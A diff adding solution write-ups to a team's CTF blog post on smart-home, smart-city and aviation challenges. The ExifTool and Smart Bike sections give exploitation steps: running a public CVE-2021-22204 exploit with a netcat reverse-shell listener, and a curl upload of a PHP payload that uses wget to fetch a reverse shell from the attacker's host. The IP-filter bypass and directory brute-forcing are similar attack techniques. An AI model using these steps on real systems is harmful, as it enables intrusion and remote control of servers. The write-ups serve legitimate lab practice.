@@ -55,7 +55,7 @@ The challenges were accessed by using remote kali virtual machines.
 
 **Note**: These challenges weren't completed alone by me, all of us in the team contributed in where we placed in the leader board and that's thanks to them.
 
-### Smart Home
+### SMART HOME
 
 #### NETWORK FIX
 
@@ -87,6 +87,14 @@ O>*10.101.31.16/30 [110/5000] via 10.5.0.1, eth1, 09w4d08h
 C>* 10.101.32.16/30 is directly connected, eth0, 16w5d14h
 O>* 172.16.15.0/24 [110/20] via 10.5.0.10, eth1, 16w5d14h
 ```
+
+##### Solution
+
+A simple routing table analysis was done: since 10.5.4.0/22 is the last IP address that falls into the range of 10.5.7.0/24 subnet, then our IP address will be the one specified after *via* - `10.5.0.5`. Enter it and get the flag.
+
+##### Steps
+
+1. Enter `10.5.0.5` IP address - the IP address answer is the flag itself.
 
 #### IT'S ALWAYS DNS
 
@@ -257,7 +265,6 @@ Grepping the file again
 So the IP is 192.168.88.230, and if it's an encrypted communication channel, the the best guess for the port would be 443, that's if using HTTPS.
 
 The guess was correct! The answer `192.168.88.230:443`.
-
 
 #### STUCK
 
@@ -609,7 +616,7 @@ Figure out what the note means and find the flag.
 strange note: <https://static.ctftech.io/challs/encoded_story.html?_gl=1>*1oieq6w*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDk0OTc0MC4xMS4xLjE2NjQ5NDk3NDEuMC4wLjA.
 ```
 
-#### SMART CITY
+### SMART CITY
 
 #### HEALTH CHECK
 
@@ -623,6 +630,20 @@ Help them to figure out what is going on.
 They have assigned you an internal IP address of 172.20.10.2 to make the ping requests against from the application.
 <http://env263.target03:1343/>
 ```
+
+##### Solution
+
+Since entering in a regular IPv4 format address returned *"Not a public IP address"&* output, a workaround was needed for this task. This IPv4 address was converted to a decimal numeral system, after which entered in integer returned a flag.
+
+##### Steps
+
+1. Go to https://dnschecker.org/ip-to-decimal.php and convert `172.20.10.2` IP address to decimal numeral system.
+
+2. The desired output is an integer number: `2886994434`, which bypasses IP address filtering.
+
+3. As seen in the screen below, the flag is: `ctftech{iP_nUmB3rz_@r3_4un}`.
+
+![Automated flag](../../images/health-check-flag.png){: .image-process-crisp}
 
 #### HARDEN
 
@@ -647,12 +668,28 @@ Password: Cool2Pass
 
 ```md
 DESCRIPTION
-Test the security of this online Exiftool service.
+Test the security of this online ExifTool service.
 QUESTION
 Can you find the vulnerability and exploit it?
 You can find the flag from the home folder.
 <http://env263.target02:8082/>
 ```
+
+##### Solution
+
+Quick google search reveals to us that ExifTool is a free and open-source software program for reading, writing, and manipulating image, audio, video, and PDF metadata. By researching futher it was found out that for this ExifTool a widely known `CVE-2021-22204 Arbitraty Code Execution` can be used to gain access to the flag.
+
+##### Steps
+
+1. Google search the exploit: `https://github.com/UNICORDev/exploit-CVE-2021-22204`, download it by using `git` commands.
+
+2. Launch a `netcat` utility reverse shell listener on `9001` port: `nc -lvnp 9001`
+
+3. Launch a CVE exploit and specify IP address through `-s` flag: `python3 exploit-CVE-2021-22204.py -s 10.X.Y.Z 9001` (here the real IPv4 address is hidden on purpose).
+
+4. Upload any file to the ExifTool service.
+
+5. Shell exploit works - by looking inside `/home` folder a suspicious `/user1337` folder is found - inside it a `flag.txt` file can be seen. Retrieved flag from the file is : `ctftech{ff379755-33f3}`.
 
 #### SMART BIKE
 
@@ -665,6 +702,32 @@ QUESTION
 Find a way to abuse the functionality of an exposed API endpoint and retrieve the flag from /var/flag.txt
 The only thing we know is the exposed IP address.
 ```
+
+##### Solution
+
+By accessing the http://envXYZ.target03:8000/ environment we can see that main page doesn't give any specifical info. Overall, the main solution of the problem was to scan API endpoints in, then feed in fake file to access `/var/flag.txt` file and get the desired flag.
+
+##### Steps
+
+1. Access `http://envXYZ.target03:8000/` environment and scan directories by using gobuster - a tool used to brute-force URIs including directories and files as well as DNS subdomains: `gobuster dir -u URL -w /usr/share/seclists/Discovery/Web-Content/common.txt`.
+
+2. By looking at scanned directories and files a `robots.txt` file was inspected. It contains the following info:
+
+![Robots file](../../images/smart-bike-robots.png){: .image-process-crisp}
+
+3. Find config.js file and inspect it - it is revealed that there is an `/upl` endpoint which will contain uploaded files, as well as a desired API key.
+
+![Config file](../../images/smart-bike-api.png){: .image-process-crisp}
+
+4. Create a reverse shell listener on `9002` port to listen for connections: nc -lvnp 9002.
+
+5. Feed in a malicious `rev.php` reverse shell PHP file through `curl` command POST request by providing apiKey value from `config.js` file to the environment's `/api` endpoint: `curl -X POST -d "apiKey=37e4950e-d638-4e9f-9fe1-56baac1b85f2&method=create&filename=create_rev.php&content=<?php passthru('wget 10.X.Y.Z:9002/rev.php'); ?>" http://envXYZ.target03:8000/api/`
+
+6. Trigger reverse shell by visiting `/upl` endpoint which now contains an uploaded malicious PHP file: `http://envXYZ.target03:8000/upl/rev.php`
+
+7. Start a python server through `python3 -m http.server 9002` to dispatch requests. 
+
+8. From the listener side access `/var/flag.txt` file to get the desired flag: `ctf-tech{757422a2-67e2}`.
 
 #### SELF-DRIVING-CAR
 
@@ -844,6 +907,25 @@ Inspect the flight plan, find out if there is anything malicious hidden in it.
 Flag format: uuid v4
 <https://static.ctftech.io/challs/flight-plan.pdf?_gl=1>*18nguau*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDkxMjAyOC43LjEuMTY2NDkxMjAyOS4wLjAuMA..
 ```
+##### Solution
+
+For this task `qpdf` package and Wine were used to access the desired flag.
+
+##### Steps
+
+1. Install qpdf package through `sudo apt-get install qpdf`
+
+2. List attachments of the PDF file: `qpdf --list-attachments flight-plan.pdf`  
+
+![PDF contents](../../images/flight-plan-contents.png){: .image-process-crisp}
+
+3. Convert this attachment through `qpdf` to another PDF file: `qpdf --show-attachment="ATS flight plan-ori" flight-plan.pdf > attachment.pdf`
+
+4. Open `attachment.pdf` through Wine compatibility layer to open the desired PDF as you would do it on a Windows platform: `wine ATS\ flight\ plan-ori.pdf`
+
+5. The desired flag gets outputted after opening the file: `3a4425f2-8882-428c-ab84-8adecf15a394`.
+
+![PDF flag](../../images/flight-plan-flag.png){: .image-process-crisp}
 
 #### WEATHER DATA
 
@@ -886,6 +968,46 @@ Username: user
 Password: Cool2Pass
 ```
 
+##### Solution
+
+First of all, we need to connect to the server through an SSH command. After that configure basic authentication by using `https://www.howtogeek.com/devops/how-to-setup-basic-http-authentication-on-apache/` guide. After restart of the service enter credentials and flag will be yours.
+
+##### Steps
+
+1. Login through SSH: `sshpass -p Cool2Pass ssh -p 2222 user@env263.target02`.
+
+2. Examine the structure of `/var/www/html` folder. Inside it there is an `evidence` folder that needs to be protected.
+
+![HTML folder](../../images/flight-plan-flag.png){: .image-process-crisp}
+
+3. Follow the guide provided in the link in the Solution section above: `https://www.howtogeek.com/devops/how-to-setup-basic-http-authentication-on-apache/`.
+
+# Generate a password file (the first option)
+
+$ sudo printf "mulder:`openssl passwd -apr1 Scully-th3-b3st\!`\n" | sudo tee .htpasswd
+mulder:$apr1$xVxxLLon$ASAgafxUZWNMiaSJzbK1n.
+
+# To do it the other way: 
+
+Open the configuration: `sudo vim /etc/apache2/apache2.conf`
+
+# Add the following content
+
+<Directory "/var/www/html">
+  AuthType Basic
+  AuthName "Restricted Content"
+  AuthUserFile /etc/apache2/.htpasswd
+  Require valid-user
+</Directory>
+
+# Restart service
+
+`sudo service apache2 restart`
+
+4. Re-open the page on the web and enter credentials as specified in the task and get the desired flag.
+
+![HTML folder](../../images/top-secret-login.png){: .image-process-crisp}
+
 #### BACKDOORED IMAGE
 
 ```md
@@ -918,7 +1040,7 @@ First of all, Docker Hub was inspected where the image was stored. After that Do
 
 5. A persistence.sh script can be see in the screenshots above - to get the flag simply open it. CTF flag is: `d4da58b6-d572-4992-8342-7747969911d5`.
 
-#### LEAKED DATA
+#### LEAKED DATA (UNSOLVED)
 
 ```md
 DESCRIPTION
@@ -946,7 +1068,7 @@ ATC Radar
 ```
 ##### Solution
 
-The solution was to use a Kali Linux ffuf web fuzzer package - it is a fest web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records) and GET and POST parameter fuzzing. Login/password were guessed, but for authentication part metasploit framework could be used as well to brute-force a way in and get the credentials.
+The solution was to use a Kali Linux `ffuf` web fuzzer package - it is a fest web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records) and GET and POST parameter fuzzing. Login/password were guessed, but for authentication part metasploit framework could be used as well to brute-force a way in and get the credentials.
 
 ##### Steps
 
